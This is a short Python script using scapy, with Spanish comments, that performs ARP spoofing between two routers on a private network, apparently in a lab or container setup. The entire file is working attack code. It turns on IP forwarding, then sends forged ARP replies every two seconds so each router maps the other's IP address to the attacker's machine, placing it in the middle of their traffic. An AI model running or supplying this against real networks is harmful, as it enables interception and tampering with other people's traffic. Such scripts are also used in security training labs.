from scapy.all import ARP, Ether, sendp
import time
import subprocess

ROUTER1_IP  = "10.0.12.1"
ROUTER2_IP  = "10.0.12.2"

ROUTER1_MAC = "12:83:e3:22:83:60"
ROUTER2_MAC = "8a:c1:04:4c:fc:6c"

IFACE = "br-7a14cf52e463"

# Activar reenvío de paquetes para no cortar la comunicación
subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])

print("[*] Iniciando ARP Spoofing. Ctrl+C para detener.")

# Engañar a router-1: "yo soy router-2"
pkt_to_r1 = Ether(dst=ROUTER1_MAC) / ARP(
    op=2,
    pdst=ROUTER1_IP,
    hwdst=ROUTER1_MAC,
    psrc=ROUTER2_IP
)

# Engañar a router-2: "yo soy router-1"
pkt_to_r2 = Ether(dst=ROUTER2_MAC) / ARP(
    op=2,
    pdst=ROUTER2_IP,
    hwdst=ROUTER2_MAC,
    psrc=ROUTER1_IP
)

try:
    while True:
        sendp(pkt_to_r1, iface=IFACE, verbose=False)
        sendp(pkt_to_r2, iface=IFACE, verbose=False)
        print("[*] Paquetes ARP enviados...")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Ataque detenido.")
